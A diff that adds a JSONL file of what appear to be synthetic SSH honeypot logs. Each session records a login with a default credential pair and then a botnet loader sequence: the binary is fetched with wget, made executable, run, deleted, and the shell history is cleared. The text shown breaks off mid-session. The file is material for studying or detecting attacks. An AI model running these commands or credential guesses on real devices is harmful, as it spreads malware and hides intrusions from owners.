@@ -1,0 +1,804 @@
+{"event": "session_start", "ts": "2026-10-20T13:54:42.483536+00:00", "session_id": "d301401c", "src_ip": "192.0.2.103", "src_port": 51809, "client_banner": "SSH-2.0-Go"}
+{"event": "auth_attempt", "ts": "2026-10-20T13:54:42.667833+00:00", "session_id": "d301401c", "src_ip": "192.0.2.103", "username": "root", "password": "123456", "accepted": true}
+{"event": "command", "ts": "2026-10-20T13:54:42.747314+00:00", "session_id": "d301401c", "src_ip": "192.0.2.103", "command": "/bin/busybox ECCHI", "seconds_since_prev": 0.0, "backspaces": 0}
+{"event": "command", "ts": "2026-10-20T13:54:42.833400+00:00", "session_id": "d301401c", "src_ip": "192.0.2.103", "command": "cat /proc/cpuinfo", "seconds_since_prev": 0.0861, "backspaces": 0}
+{"event": "command", "ts": "2026-10-20T13:54:42.888782+00:00", "session_id": "d301401c", "src_ip": "192.0.2.103", "command": "cd /tmp || cd /var/run || cd /mnt", "seconds_since_prev": 0.0554, "backspaces": 0}
+{"event": "command", "ts": "2026-10-20T13:54:42.978394+00:00", "session_id": "d301401c", "src_ip": "192.0.2.103", "command": "wget http://192.0.2.250/bins/arm7 -O .x", "seconds_since_prev": 0.0896, "backspaces": 0}
+{"event": "command", "ts": "2026-10-20T13:54:43.028641+00:00", "session_id": "d301401c", "src_ip": "192.0.2.103", "command": "chmod 777 .x", "seconds_since_prev": 0.0502, "backspaces": 0}
+{"event": "command", "ts": "2026-10-20T13:54:43.101455+00:00", "session_id": "d301401c", "src_ip": "192.0.2.103", "command": "./.x ssh", "seconds_since_prev": 0.0728, "backspaces": 0}
+{"event": "command", "ts": "2026-10-20T13:54:43.187070+00:00", "session_id": "d301401c", "src_ip": "192.0.2.103", "command": "rm -rf .x", "seconds_since_prev": 0.0856, "backspaces": 0}
+{"event": "command", "ts": "2026-10-20T13:54:43.232534+00:00", "session_id": "d301401c", "src_ip": "192.0.2.103", "command": "history -c", "seconds_since_prev": 0.0455, "backspaces": 0}
+{"event": "session_end", "ts": "2026-10-20T13:54:44.070928+00:00", "session_id": "d301401c", "src_ip": "192.0.2.103", "duration_s": 1.587, "command_count": 8, "auth_attempts": 1, "reason": "closed"}
+{"event": "session_start", "ts": "2026-10-18T15:41:42.483536+00:00", "session_id": "739b9e55", "src_ip": "192.0.2.103", "src_port": 50371, "client_banner": "SSH-2.0-libssh-0.9.6"}
+{"event": "auth_attempt", "ts": "2026-10-18T15:41:42.765848+00:00", "session_id": "739b9e55", "src_ip": "192.0.2.103", "username": "support", "password": "support", "accepted": true}
+{"event": "command", "ts": "2026-10-18T15:41:42.847473+00:00", "session_id": "739b9e55", "src_ip": "192.0.2.103", "command": "/bin/busybox ECCHI", "seconds_since_prev": 0.0, "backspaces": 0}
+{"event": "command", "ts": "2026-10-18T15:41:42.917196+00:00", "session_id": "739b9e55", "src_ip": "192.0.2.103", "command": "cat /proc/cpuinfo", "seconds_since_prev": 0.0697, "backspaces": 0}
+{"event": "command", "ts": "2026-10-18T15:41:42.980243+00:00", "session_id": "739b9e55", "src_ip": "192.0.2.103", "command": "cd /tmp || cd /var/run || cd /mnt", "seconds_since_prev": 0.063, "backspaces": 0}
+{"event": "command", "ts": "2026-10-18T15:41:43.068121+00:00", "session_id": "739b9e55", "src_ip": "192.0.2.103", "command": "wget http://192.0.2.250/bins/arm7 -O .x", "seconds_since_prev": 0.0879, "backspaces": 0}
+{"event": "command", "ts": "2026-10-18T15:41:43.147907+00:00", "session_id": "739b9e55", "src_ip": "192.0.2.103", "command": "chmod 777 .x", "seconds_since_prev": 0.0798, "backspaces": 0}
+{"event": "command", "ts": "2026-10-18T15:41:43.203593+00:00", "session_id": "739b9e55", "src_ip": "192.0.2.103", "command": "./.x ssh", "seconds_since_prev": 0.0557, "backspaces": 0}
+{"event": "command", "ts": "2026-10-18T15:41:43.278120+00:00", "session_id": "739b9e55", "src_ip": "192.0.2.103", "command": "rm -rf .x", "seconds_since_prev": 0.0745, "backspaces": 0}
+{"event": "command", "ts": "2026-10-18T15:41:43.363875+00:00", "session_id": "739b9e55", "src_ip": "192.0.2.103", "command": "history -c", "seconds_since_prev": 0.0858, "backspaces": 0}
+{"event": "session_end", "ts": "2026-10-18T15:41:43.875317+00:00", "session_id": "739b9e55", "src_ip": "192.0.2.103", "duration_s": 1.392, "command_count": 8, "auth_attempts": 1, "reason": "closed"}
+{"event": "session_start", "ts": "2026-10-17T17:44:42.483536+00:00", "session_id": "cd73430a", "src_ip": "192.0.2.14", "src_port": 34734, "client_banner": "SSH-2.0-Go"}
+{"event": "auth_attempt", "ts": "2026-10-17T17:44:42.676151+00:00", "session_id": "cd73430a", "src_ip": "192.0.2.14", "username": "root", "password": "root", "accepted": true}
+{"event": "command", "ts": "2026-10-17T17:44:42.748797+00:00", "session_id": "cd73430a", "src_ip": "192.0.2.14", "command": "/bin/busybox ECCHI", "seconds_since_prev": 0.0, "backspaces": 0}
+{"event": "command", "ts": "2026-10-17T17:44:42.819784+00:00", "session_id": "cd73430a", "src_ip": "192.0.2.14", "command": "cat /proc/cpuinfo", "seconds_since_prev": 0.071, "backspaces": 0}
+{"event": "command", "ts": "2026-10-17T17:44:42.893564+00:00", "session_id": "cd73430a", "src_ip": "192.0.2.14", "command": "cd /tmp || cd /var/run || cd /mnt", "seconds_since_prev": 0.0738, "backspaces": 0}
+{"event": "command", "ts": "2026-10-17T17:44:42.965314+00:00", "session_id": "cd73430a", "src_ip": "192.0.2.14", "command": "wget http://192.0.2.250/bins/arm7 -O .x", "seconds_since_prev": 0.0717, "backspaces": 0}
+{"event": "command", "ts": "2026-10-17T17:44:43.015165+00:00", "session_id": "cd73430a", "src_ip": "192.0.2.14", "command": "chmod 777 .x", "seconds_since_prev": 0.0499, "backspaces": 0}
+{"event": "command", "ts": "2026-10-17T17:44:43.069411+00:00", "session_id": "cd73430a", "src_ip": "192.0.2.14", "command": "./.x ssh", "seconds_since_prev": 0.0542, "backspaces": 0}
+{"event": "command", "ts": "2026-10-17T17:44:43.132027+00:00", "session_id": "cd73430a", "src_ip": "192.0.2.14", "command": "rm -rf .x", "seconds_since_prev": 0.0626, "backspaces": 0}
+{"event": "command", "ts": "2026-10-17T17:44:43.217854+00:00", "session_id": "cd73430a", "src_ip": "192.0.2.14", "command": "history -c", "seconds_since_prev": 0.0858, "backspaces": 0}
+{"event": "session_end", "ts": "2026-10-17T17:44:44.036269+00:00", "session_id": "cd73430a", "src_ip": "192.0.2.14", "duration_s": 1.553, "command_count": 8, "auth_attempts": 1, "reason": "closed"}
+{"event": "session_start", "ts": "2026-10-17T14:59:42.483536+00:00", "session_id": "a667bd49", "src_ip": "198.51.100.91", "src_port": 44994, "client_banner": "SSH-2.0-libssh-0.9.6"}
+{"event": "auth_attempt", "ts": "2026-10-17T14:59:42.725899+00:00", "session_id": "a667bd49", "src_ip": "198.51.100.91", "username": "support", "password": "support", "accepted": true}
+{"event": "command", "ts": "2026-10-17T14:59:42.804699+00:00", "session_id": "a667bd49", "src_ip": "198.51.100.91", "command": "/bin/busybox ECCHI", "seconds_since_prev": 0.0, "backspaces": 0}
+{"event": "command", "ts": "2026-10-17T14:59:42.872470+00:00", "session_id": "a667bd49", "src_ip": "198.51.100.91", "command": "cat /proc/cpuinfo", "seconds_since_prev": 0.0678, "backspaces": 0}
+{"event": "command", "ts": "2026-10-17T14:59:42.944758+00:00", "session_id": "a667bd49", "src_ip": "198.51.100.91", "command": "cd /tmp || cd /var/run || cd /mnt", "seconds_since_prev": 0.0723, "backspaces": 0}
+{"event": "command", "ts": "2026-10-17T14:59:43.027179+00:00", "session_id": "a667bd49", "src_ip": "198.51.100.91", "command": "wget http://192.0.2.250/bins/arm7 -O .x", "seconds_since_prev": 0.0824, "backspaces": 0}
+{"event": "command", "ts": "2026-10-17T14:59:43.077862+00:00", "session_id": "a667bd49", "src_ip": "198.51.100.91", "command": "chmod 777 .x", "seconds_since_prev": 0.0507, "backspaces": 0}
+{"event": "command", "ts": "2026-10-17T14:59:43.166585+00:00", "session_id": "a667bd49", "src_ip": "198.51.100.91", "command": "./.x ssh", "seconds_since_prev": 0.0887, "backspaces": 0}
+{"event": "command", "ts": "2026-10-17T14:59:43.233039+00:00", "session_id": "a667bd49", "src_ip": "198.51.100.91", "command": "rm -rf .x", "seconds_since_prev": 0.0665, "backspaces": 0}
+{"event": "command", "ts": "2026-10-17T14:59:43.299461+00:00", "session_id": "a667bd49", "src_ip": "198.51.100.91", "command": "history -c", "seconds_since_prev": 0.0664, "backspaces": 0}
+{"event": "session_end", "ts": "2026-10-17T14:59:44.097250+00:00", "session_id": "a667bd49", "src_ip": "198.51.100.91", "duration_s": 1.614, "command_count": 8, "auth_attempts": 1, "reason": "closed"}
+{"event": "session_start", "ts": "2026-10-16T12:54:42.483536+00:00", "session_id": "77c73492", "src_ip": "198.51.100.91", "src_port": 64229, "client_banner": "SSH-2.0-libssh-0.9.6"}
+{"event": "auth_attempt", "ts": "2026-10-16T12:54:42.704192+00:00", "session_id": "77c73492", "src_ip": "198.51.100.91", "username": "root", "password": "root", "accepted": true}
+{"event": "command", "ts": "2026-10-16T12:54:42.781801+00:00", "session_id": "77c73492", "src_ip": "198.51.100.91", "command": "/bin/busybox ECCHI", "seconds_since_prev": 0.0, "backspaces": 0}
+{"event": "command", "ts": "2026-10-16T12:54:42.858245+00:00", "session_id": "77c73492", "src_ip": "198.51.100.91", "command": "cat /proc/cpuinfo", "seconds_since_prev": 0.0764, "backspaces": 0}
+{"event": "command", "ts": "2026-10-16T12:54:42.915875+00:00", "session_id": "77c73492", "src_ip": "198.51.100.91", "command": "cd /tmp || cd /var/run || cd /mnt", "seconds_since_prev": 0.0576, "backspaces": 0}
+{"event": "command", "ts": "2026-10-16T12:54:42.983794+00:00", "session_id": "77c73492", "src_ip": "198.51.100.91", "command": "wget http://192.0.2.250/bins/arm7 -O .x", "seconds_since_prev": 0.0679, "backspaces": 0}
+{"event": "command", "ts": "2026-10-16T12:54:43.052243+00:00", "session_id": "77c73492", "src_ip": "198.51.100.91", "command": "chmod 777 .x", "seconds_since_prev": 0.0684, "backspaces": 0}
+{"event": "command", "ts": "2026-10-16T12:54:43.105107+00:00", "session_id": "77c73492", "src_ip": "198.51.100.91", "command": "./.x ssh", "seconds_since_prev": 0.0529, "backspaces": 0}
+{"event": "command", "ts": "2026-10-16T12:54:43.148446+00:00", "session_id": "77c73492", "src_ip": "198.51.100.91", "command": "rm -rf .x", "seconds_since_prev": 0.0433, "backspaces": 0}
+{"event": "command", "ts": "2026-10-16T12:54:43.194971+00:00", "session_id": "77c73492", "src_ip": "198.51.100.91", "command": "history -c", "seconds_since_prev": 0.0465, "backspaces": 0}
+{"event": "session_end", "ts": "2026-10-16T12:54:43.347981+00:00", "session_id": "77c73492", "src_ip": "198.51.100.91", "duration_s": 0.864, "command_count": 8, "auth_attempts": 1, "reason": "closed"}
+{"event": "session_start", "ts": "2026-10-16T20:01:42.483536+00:00", "session_id": "c6fd6bed", "src_ip": "192.0.2.14", "src_port": 46583, "client_banner": "SSH-2.0-libssh2_1.9.0"}
+{"event": "auth_attempt", "ts": "2026-10-16T20:01:42.840690+00:00", "session_id": "c6fd6bed", "src_ip": "192.0.2.14", "username": "root", "password": "1234", "accepted": true}
+{"event": "command", "ts": "2026-10-16T20:01:42.908417+00:00", "session_id": "c6fd6bed", "src_ip": "192.0.2.14", "command": "/bin/busybox ECCHI", "seconds_since_prev": 0.0, "backspaces": 0}
+{"event": "command", "ts": "2026-10-16T20:01:42.969770+00:00", "session_id": "c6fd6bed", "src_ip": "192.0.2.14", "command": "cat /proc/cpuinfo", "seconds_since_prev": 0.0614, "backspaces": 0}
+{"event": "command", "ts": "2026-10-16T20:01:43.040090+00:00", "session_id": "c6fd6bed", "src_ip": "192.0.2.14", "command": "cd /tmp || cd /var/run || cd /mnt", "seconds_since_prev": 0.0703, "backspaces": 0}
+{"event": "command", "ts": "2026-10-16T20:01:43.124147+00:00", "session_id": "c6fd6bed", "src_ip": "192.0.2.14", "command": "wget http://192.0.2.250/bins/arm7 -O .x", "seconds_since_prev": 0.0841, "backspaces": 0}
+{"event": "command", "ts": "2026-10-16T20:01:43.210698+00:00", "session_id": "c6fd6bed", "src_ip": "192.0.2.14", "command": "chmod 777 .x", "seconds_since_prev": 0.0866, "backspaces": 0}
+{"event": "command", "ts": "2026-10-16T20:01:43.272195+00:00", "session_id": "c6fd6bed", "src_ip": "192.0.2.14", "command": "./.x ssh", "seconds_since_prev": 0.0615, "backspaces": 0}
+{"event": "command", "ts": "2026-10-16T20:01:43.349249+00:00", "session_id": "c6fd6bed", "src_ip": "192.0.2.14", "command": "rm -rf .x", "seconds_since_prev": 0.0771, "backspaces": 0}
+{"event": "command", "ts": "2026-10-16T20:01:43.397027+00:00", "session_id": "c6fd6bed", "src_ip": "192.0.2.14", "command": "history -c", "seconds_since_prev": 0.0478, "backspaces": 0}
+{"event": "session_end", "ts": "2026-10-16T20:01:44.067555+00:00", "session_id": "c6fd6bed", "src_ip": "192.0.2.14", "duration_s": 1.584, "command_count": 8, "auth_attempts": 1, "reason": "closed"}
+{"event": "session_start", "ts": "2026-10-18T11:13:42.483536+00:00", "session_id": "b77351d4", "src_ip": "192.0.2.57", "src_port": 44008, "client_banner": "SSH-2.0-libssh-0.9.6"}
+{"event": "auth_attempt", "ts": "2026-10-18T11:13:42.600569+00:00", "session_id": "b77351d4", "src_ip": "192.0.2.57", "username": "root", "password": "vizxv", "accepted": true}
+{"event": "command", "ts": "2026-10-18T11:13:42.664772+00:00", "session_id": "b77351d4", "src_ip": "192.0.2.57", "command": "/bin/busybox ECCHI", "seconds_since_prev": 0.0, "backspaces": 0}
+{"event": "command", "ts": "2026-10-18T11:13:42.735431+00:00", "session_id": "b77351d4", "src_ip": "192.0.2.57", "command": "cat /proc/cpuinfo", "seconds_since_prev": 0.0707, "backspaces": 0}
+{"event": "command", "ts": "2026-10-18T11:13:42.803072+00:00", "session_id": "b77351d4", "src_ip": "192.0.2.57", "command": "cd /tmp || cd /var/run || cd /mnt", "seconds_since_prev": 0.0676, "backspaces": 0}
+{"event": "command", "ts": "2026-10-18T11:13:42.851058+00:00", "session_id": "b77351d4", "src_ip": "192.0.2.57", "command": "wget http://192.0.2.250/bins/arm7 -O .x", "seconds_since_prev": 0.048, "backspaces": 0}
+{"event": "command", "ts": "2026-10-18T11:13:42.926628+00:00", "session_id": "b77351d4", "src_ip": "192.0.2.57", "command": "chmod 777 .x", "seconds_since_prev": 0.0756, "backspaces": 0}
+{"event": "command", "ts": "2026-10-18T11:13:43.008762+00:00", "session_id": "b77351d4", "src_ip": "192.0.2.57", "command": "./.x ssh", "seconds_since_prev": 0.0821, "backspaces": 0}
+{"event": "command", "ts": "2026-10-18T11:13:43.068410+00:00", "session_id": "b77351d4", "src_ip": "192.0.2.57", "command": "rm -rf .x", "seconds_since_prev": 0.0596, "backspaces": 0}
+{"event": "command", "ts": "2026-10-18T11:13:43.118137+00:00", "session_id": "b77351d4", "src_ip": "192.0.2.57", "command": "history -c", "seconds_since_prev": 0.0497, "backspaces": 0}
+{"event": "session_end", "ts": "2026-10-18T11:13:43.904594+00:00", "session_id": "b77351d4", "src_ip": "192.0.2.57", "duration_s": 1.421, "command_count": 8, "auth_attempts": 1, "reason": "closed"}
+{"event": "session_start", "ts": "2026-10-20T12:08:42.483536+00:00", "session_id": "e26c9458", "src_ip": "192.0.2.57", "src_port": 51081, "client_banner": "SSH-2.0-Go"}
+{"event": "auth_attempt", "ts": "2026-10-20T12:08:42.547317+00:00", "session_id": "e26c9458", "src_ip": "192.0.2.57", "username": "root", "password": "1234", "accepted": true}
+{"event": "command", "ts": "2026-10-20T12:08:42.614315+00:00", "session_id": "e26c9458", "src_ip": "192.0.2.57", "command": "/bin/busybox ECCHI", "seconds_since_prev": 0.0, "backspaces": 0}
+{"event": "command", "ts": "2026-10-20T12:08:42.663921+00:00", "session_id": "e26c9458", "src_ip": "192.0.2.57", "command": "cat /proc/cpuinfo", "seconds_since_prev": 0.0496, "backspaces": 0}
+{"event": "command", "ts": "2026-10-20T12:08:42.725795+00:00", "session_id": "e26c9458", "src_ip": "192.0.2.57", "command": "cd /tmp || cd /var/run || cd /mnt", "seconds_since_prev": 0.0619, "backspaces": 0}
+{"event": "command", "ts": "2026-10-20T12:08:42.803957+00:00", "session_id": "e26c9458", "src_ip": "192.0.2.57", "command": "wget http://192.0.2.250/bins/arm7 -O .x", "seconds_since_prev": 0.0782, "backspaces": 0}
+{"event": "command", "ts": "2026-10-20T12:08:42.891921+00:00", "session_id": "e26c9458", "src_ip": "192.0.2.57", "command": "chmod 777 .x", "seconds_since_prev": 0.088, "backspaces": 0}
+{"event": "command", "ts": "2026-10-20T12:08:42.947678+00:00", "session_id": "e26c9458", "src_ip": "192.0.2.57", "command": "./.x ssh", "seconds_since_prev": 0.0558, "backspaces": 0}
+{"event": "command", "ts": "2026-10-20T12:08:43.007798+00:00", "session_id": "e26c9458", "src_ip": "192.0.2.57", "command": "rm -rf .x", "seconds_since_prev": 0.0601, "backspaces": 0}
+{"event": "command", "ts": "2026-10-20T12:08:43.065733+00:00", "session_id": "e26c9458", "src_ip": "192.0.2.57", "command": "history -c", "seconds_since_prev": 0.0579, "backspaces": 0}
+{"event": "session_end", "ts": "2026-10-20T12:08:43.991263+00:00", "session_id": "e26c9458", "src_ip": "192.0.2.57", "duration_s": 1.508, "command_count": 8, "auth_attempts": 1, "reason": "closed"}
+{"event": "session_start", "ts": "2026-10-19T11:49:42.483536+00:00", "session_id": "9116ff4e", "src_ip": "198.51.100.22", "src_port": 45513, "client_banner": "SSH-2.0-libssh2_1.9.0"}
+{"event": "auth_attempt", "ts": "2026-10-19T11:49:42.668434+00:00", "session_id": "9116ff4e", "src_ip": "198.51.100.22", "username": "root", "password": "vizxv", "accepted": true}
+{"event": "command", "ts": "2026-10-19T11:49:42.743852+00:00", "session_id": "9116ff4e", "src_ip": "198.51.100.22", "command": "/bin/busybox ECCHI", "seconds_since_prev": 0.0, "backspaces": 0}
+{"event": "command", "ts": "2026-10-19T11:49:42.806891+00:00", "session_id": "9116ff4e", "src_ip": "198.51.100.22", "command": "cat /proc/cpuinfo", "seconds_since_prev": 0.063, "backspaces": 0}
+{"event": "command", "ts": "2026-10-19T11:49:42.847035+00:00", "session_id": "9116ff4e", "src_ip": "198.51.100.22", "command": "cd /tmp || cd /var/run || cd /mnt", "seconds_since_prev": 0.0401, "backspaces": 0}
+{"event": "command", "ts": "2026-10-19T11:49:42.891324+00:00", "session_id": "9116ff4e", "src_ip": "198.51.100.22", "command": "wget http://192.0.2.250/bins/arm7 -O .x", "seconds_since_prev": 0.0443, "backspaces": 0}
+{"event": "command", "ts": "2026-10-19T11:49:42.977912+00:00", "session_id": "9116ff4e", "src_ip": "198.51.100.22", "command": "chmod 777 .x", "seconds_since_prev": 0.0866, "backspaces": 0}
+{"event": "command", "ts": "2026-10-19T11:49:43.042498+00:00", "session_id": "9116ff4e", "src_ip": "198.51.100.22", "command": "./.x ssh", "seconds_since_prev": 0.0646, "backspaces": 0}
+{"event": "command", "ts": "2026-10-19T11:49:43.123474+00:00", "session_id": "9116ff4e", "src_ip": "198.51.100.22", "command": "rm -rf .x", "seconds_since_prev": 0.081, "backspaces": 0}
+{"event": "command", "ts": "2026-10-19T11:49:43.208889+00:00", "session_id": "9116ff4e", "src_ip": "198.51.100.22", "command": "history -c", "seconds_since_prev": 0.0854, "backspaces": 0}
+{"event": "session_end", "ts": "2026-10-19T11:49:44.205722+00:00", "session_id": "9116ff4e", "src_ip": "198.51.100.22", "duration_s": 1.722, "command_count": 8, "auth_attempts": 1, "reason": "closed"}
+{"event": "session_start", "ts": "2026-10-16T13:46:42.483536+00:00", "session_id": "b254fc06", "src_ip": "198.51.100.22", "src_port": 37450, "client_banner": "SSH-2.0-libssh2_1.9.0"}
+{"event": "auth_attempt", "ts": "2026-10-16T13:46:42.766985+00:00", "session_id": "b254fc06", "src_ip": "198.51.100.22", "username": "root", "password": "1234", "accepted": true}
+{"event": "command", "ts": "2026-10-16T13:46:42.822050+00:00", "session_id": "b254fc06", "src_ip": "198.51.100.22", "command": "/bin/busybox ECCHI", "seconds_since_prev": 0.0, "backspaces": 0}
+{"event": "command", "ts": "2026-10-16T13:46:42.886632+00:00", "session_id": "b254fc06", "src_ip": "198.51.100.22", "command": "cat /proc/cpuinfo", "seconds_since_prev": 0.0646, "backspaces": 0}
+{"event": "command", "ts": "2026-10-16T13:46:42.962481+00:00", "session_id": "b254fc06", "src_ip": "198.51.100.22", "command": "cd /tmp || cd /var/run || cd /mnt", "seconds_since_prev": 0.0758, "backspaces": 0}
+{"event": "command", "ts": "2026-10-16T13:46:43.020264+00:00", "session_id": "b254fc06", "src_ip": "198.51.100.22", "command": "wget http://192.0.2.250/bins/arm7 -O .x", "seconds_since_prev": 0.0578, "backspaces": 0}
+{"event": "command", "ts": "2026-10-16T13:46:43.076684+00:00", "session_id": "b254fc06", "src_ip": "198.51.100.22", "command": "chmod 777 .x", "seconds_since_prev": 0.0564, "backspaces": 0}
+{"event": "command", "ts": "2026-10-16T13:46:43.130522+00:00", "session_id": "b254fc06", "src_ip": "198.51.100.22", "command": "./.x ssh", "seconds_since_prev": 0.0538, "backspaces": 0}
+{"event": "command", "ts": "2026-10-16T13:46:43.218986+00:00", "session_id": "b254fc06", "src_ip": "198.51.100.22", "command": "rm -rf .x", "seconds_since_prev": 0.0885, "backspaces": 0}
+{"event": "command", "ts": "2026-10-16T13:46:43.293022+00:00", "session_id": "b254fc06", "src_ip": "198.51.100.22", "command": "history -c", "seconds_since_prev": 0.074, "backspaces": 0}
+{"event": "session_end", "ts": "2026-10-16T13:46:43.998759+00:00", "session_id": "b254fc06", "src_ip": "198.51.100.22", "duration_s": 1.515, "command_count": 8, "auth_attempts": 1, "reason": "closed"}
+{"event": "session_start", "ts": "2026-10-17T13:58:42.483536+00:00", "session_id": "a1657f63", "src_ip": "198.51.100.91", "src_port": 62523, "client_banner": "SSH-2.0-Go"}
+{"event": "auth_attempt", "ts": "2026-10-17T13:58:42.637228+00:00", "session_id": "a1657f63", "src_ip": "198.51.100.91", "username": "root", "password": "root", "accepted": true}
+{"event": "command", "ts": "2026-10-17T13:58:42.684662+00:00", "session_id": "a1657f63", "src_ip": "198.51.100.91", "command": "/bin/busybox ECCHI", "seconds_since_prev": 0.0, "backspaces": 0}
+{"event": "command", "ts": "2026-10-17T13:58:42.747958+00:00", "session_id": "a1657f63", "src_ip": "198.51.100.91", "command": "cat /proc/cpuinfo", "seconds_since_prev": 0.0633, "backspaces": 0}
+{"event": "command", "ts": "2026-10-17T13:58:42.791975+00:00", "session_id": "a1657f63", "src_ip": "198.51.100.91", "command": "cd /tmp || cd /var/run || cd /mnt", "seconds_since_prev": 0.044, "backspaces": 0}
+{"event": "command", "ts": "2026-10-17T13:58:42.875637+00:00", "session_id": "a1657f63", "src_ip": "198.51.100.91", "command": "wget http://192.0.2.250/bins/arm7 -O .x", "seconds_since_prev": 0.0837, "backspaces": 0}
+{"event": "command", "ts": "2026-10-17T13:58:42.952283+00:00", "session_id": "a1657f63", "src_ip": "198.51.100.91", "command": "chmod 777 .x", "seconds_since_prev": 0.0766, "backspaces": 0}
+{"event": "command", "ts": "2026-10-17T13:58:43.016729+00:00", "session_id": "a1657f63", "src_ip": "198.51.100.91", "command": "./.x ssh", "seconds_since_prev": 0.0644, "backspaces": 0}
+{"event": "command", "ts": "2026-10-17T13:58:43.079607+00:00", "session_id": "a1657f63", "src_ip": "198.51.100.91", "command": "rm -rf .x", "seconds_since_prev": 0.0629, "backspaces": 0}
+{"event": "command", "ts": "2026-10-17T13:58:43.155693+00:00", "session_id": "a1657f63", "src_ip": "198.51.100.91", "command": "history -c", "seconds_since_prev": 0.0761, "backspaces": 0}
+{"event": "session_end", "ts": "2026-10-17T13:58:43.413438+00:00", "session_id": "a1657f63", "src_ip": "198.51.100.91", "duration_s": 0.93, "command_count": 8, "auth_attempts": 1, "reason": "closed"}
+{"event": "session_start", "ts": "2026-10-16T16:24:42.483536+00:00", "session_id": "557fa4d7", "src_ip": "192.0.2.57", "src_port": 58878, "client_banner": "SSH-2.0-Go"}
+{"event": "auth_attempt", "ts": "2026-10-16T16:24:42.694872+00:00", "session_id": "557fa4d7", "src_ip": "192.0.2.57", "username": "root", "password": "root", "accepted": true}
+{"event": "command", "ts": "2026-10-16T16:24:42.775131+00:00", "session_id": "557fa4d7", "src_ip": "192.0.2.57", "command": "/bin/busybox ECCHI", "seconds_since_prev": 0.0, "backspaces": 0}
+{"event": "command", "ts": "2026-10-16T16:24:42.848792+00:00", "session_id": "557fa4d7", "src_ip": "192.0.2.57", "command": "cat /proc/cpuinfo", "seconds_since_prev": 0.0737, "backspaces": 0}
+{"event": "command", "ts": "2026-10-16T16:24:42.926409+00:00", "session_id": "557fa4d7", "src_ip": "192.0.2.57", "command": "cd /tmp || cd /var/run || cd /mnt", "seconds_since_prev": 0.0776, "backspaces": 0}
+{"event": "command", "ts": "2026-10-16T16:24:42.967662+00:00", "session_id": "557fa4d7", "src_ip": "192.0.2.57", "command": "wget http://192.0.2.250/bins/arm7 -O .x", "seconds_since_prev": 0.0413, "backspaces": 0}
+{"event": "command", "ts": "2026-10-16T16:24:43.028976+00:00", "session_id": "557fa4d7", "src_ip": "192.0.2.57", "command": "chmod 777 .x", "seconds_since_prev": 0.0613, "backspaces": 0}
+{"event": "command", "ts": "2026-10-16T16:24:43.108587+00:00", "session_id": "557fa4d7", "src_ip": "192.0.2.57", "command": "./.x ssh", "seconds_since_prev": 0.0796, "backspaces": 0}
+{"event": "command", "ts": "2026-10-16T16:24:43.153710+00:00", "session_id": "557fa4d7", "src_ip": "192.0.2.57", "command": "rm -rf .x", "seconds_since_prev": 0.0451, "backspaces": 0}
+{"event": "command", "ts": "2026-10-16T16:24:43.202205+00:00", "session_id": "557fa4d7", "src_ip": "192.0.2.57", "command": "history -c", "seconds_since_prev": 0.0485, "backspaces": 0}
+{"event": "session_end", "ts": "2026-10-16T16:24:43.948182+00:00", "session_id": "557fa4d7", "src_ip": "192.0.2.57", "duration_s": 1.465, "command_count": 8, "auth_attempts": 1, "reason": "closed"}
+{"event": "session_start", "ts": "2026-10-17T17:19:42.483536+00:00", "session_id": "b39319ac", "src_ip": "192.0.2.57", "src_port": 40450, "client_banner": "SSH-2.0-libssh2_1.9.0"}
+{"event": "auth_attempt", "ts": "2026-10-17T17:19:42.726051+00:00", "session_id": "b39319ac", "src_ip": "192.0.2.57", "username": "root", "password": "admin", "accepted": true}
+{"event": "command", "ts": "2026-10-17T17:19:42.811653+00:00", "session_id": "b39319ac", "src_ip": "192.0.2.57", "command": "/bin/busybox ECCHI", "seconds_since_prev": 0.0, "backspaces": 0}
+{"event": "command", "ts": "2026-10-17T17:19:42.880527+00:00", "session_id": "b39319ac", "src_ip": "192.0.2.57", "command": "cat /proc/cpuinfo", "seconds_since_prev": 0.0689, "backspaces": 0}
+{"event": "command", "ts": "2026-10-17T17:19:42.932804+00:00", "session_id": "b39319ac", "src_ip": "192.0.2.57", "command": "cd /tmp || cd /var/run || cd /mnt", "seconds_since_prev": 0.0523, "backspaces": 0}
+{"event": "command", "ts": "2026-10-17T17:19:43.018521+00:00", "session_id": "b39319ac", "src_ip": "192.0.2.57", "command": "wget http://192.0.2.250/bins/arm7 -O .x", "seconds_since_prev": 0.0857, "backspaces": 0}
+{"event": "command", "ts": "2026-10-17T17:19:43.061464+00:00", "session_id": "b39319ac", "src_ip": "192.0.2.57", "command": "chmod 777 .x", "seconds_since_prev": 0.0429, "backspaces": 0}
+{"event": "command", "ts": "2026-10-17T17:19:43.112835+00:00", "session_id": "b39319ac", "src_ip": "192.0.2.57", "command": "./.x ssh", "seconds_since_prev": 0.0514, "backspaces": 0}
+{"event": "command", "ts": "2026-10-17T17:19:43.192240+00:00", "session_id": "b39319ac", "src_ip": "192.0.2.57", "command": "rm -rf .x", "seconds_since_prev": 0.0794, "backspaces": 0}
+{"event": "command", "ts": "2026-10-17T17:19:43.248655+00:00", "session_id": "b39319ac", "src_ip": "192.0.2.57", "command": "history -c", "seconds_since_prev": 0.0564, "backspaces": 0}
+{"event": "session_end", "ts": "2026-10-17T17:19:43.845094+00:00", "session_id": "b39319ac", "src_ip": "192.0.2.57", "duration_s": 1.362, "command_count": 8, "auth_attempts": 1, "reason": "closed"}
+{"event": "session_start", "ts": "2026-10-18T17:13:42.483536+00:00", "session_id": "499b191f", "src_ip": "192.0.2.14", "src_port": 53652, "client_banner": "SSH-2.0-libssh2_1.9.0"}
+{"event": "auth_attempt", "ts": "2026-10-18T17:13:42.629094+00:00", "session_id": "499b191f", "src_ip": "192.0.2.14", "username": "root", "password": "123456", "accepted": true}
+{"event": "command", "ts": "2026-10-18T17:13:42.688026+00:00", "session_id": "499b191f", "src_ip": "192.0.2.14", "command": "/bin/busybox ECCHI", "seconds_since_prev": 0.0, "backspaces": 0}
+{"event": "command", "ts": "2026-10-18T17:13:42.728034+00:00", "session_id": "499b191f", "src_ip": "192.0.2.14", "command": "cat /proc/cpuinfo", "seconds_since_prev": 0.04, "backspaces": 0}
+{"event": "command", "ts": "2026-10-18T17:13:42.808463+00:00", "session_id": "499b191f", "src_ip": "192.0.2.14", "command": "cd /tmp || cd /var/run || cd /mnt", "seconds_since_prev": 0.0804, "backspaces": 0}
+{"event": "command", "ts": "2026-10-18T17:13:42.894104+00:00", "session_id": "499b191f", "src_ip": "192.0.2.14", "command": "wget http://192.0.2.250/bins/arm7 -O .x", "seconds_since_prev": 0.0856, "backspaces": 0}
